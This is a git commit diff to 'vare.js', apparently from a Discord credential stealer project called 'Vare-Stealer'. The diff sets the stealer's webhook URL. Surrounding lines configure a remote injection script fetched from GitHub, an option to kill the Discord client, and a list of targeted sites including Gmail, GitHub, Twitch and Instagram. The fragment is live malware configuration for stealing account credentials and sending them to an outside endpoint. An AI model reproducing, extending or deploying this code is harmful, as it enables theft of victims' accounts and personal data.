8a38786046483ce804f7301d43eee4aa5f6a53d8
THEMANYEET21 <eudmanlol@gmail.com>
2025-04-10 09:38:40 -0400

    Update vare.js

--- vare.js
+++ vare.js
@@ -16,7 +16,7 @@ const buf_replace = require('buffer-replace');
 let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";
 
 
-const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
+const %webhookstring% = "https://discord.github.com"
 const %INJURLL% = "https://raw.githubusercontent.com/saintdaddy/Vare-Stealer/main/injection/index.js"
 const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']
 
